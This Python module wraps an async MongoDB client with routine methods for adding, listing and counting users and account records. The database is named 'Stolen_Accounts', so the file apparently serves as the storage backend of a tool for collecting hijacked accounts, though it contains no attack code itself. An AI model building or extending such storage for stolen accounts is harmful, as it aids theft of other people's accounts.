import datetime
import motor.motor_asyncio

from variables import Vars


class Database:

    def __init__(self, mogodb_url):
        self._client = motor.motor_asyncio.AsyncIOMotorClient(mogodb_url)
        self.db = self._client['Stolen_Accounts']
        self.col = self.db.users
        self.accounts = self.db.accounts

    def new_user(self, user_id: int) -> dict:

        base = dict(
            user_id=int(user_id),
            join_date=datetime.datetime.utcnow().isoformat()
        )

        return base

    async def add_user(self, user_id: int):

        user_found = await self.col.find_one({"user_id": int(user_id)})

        if not user_found:
            await self.col.insert_one(self.new_user(user_id))

    async def add_user_account(self, account: dict):

        account_found = await self.accounts.find_one({"user_id": account.get('user_id')})

        if not account_found:
            await self.accounts.insert_one(account)

    async def get_all_users(self):
        users = self.col.find({})
        return users

    async def get_all_user_accounts(self):
        accounts = self.accounts.find({})
        return accounts

    async def total_users_count(self):
        count = await self.col.count_documents({})
        return count

    async def total_user_accounts_count(self):
        count = await self.accounts.count_documents({})
        return count

    async def get_account(self, account_user_id):
        account = await self.accounts.find_one({"user_id": account_user_id})
        return account if account else {}


db = Database(Vars.MONGODB_URL)
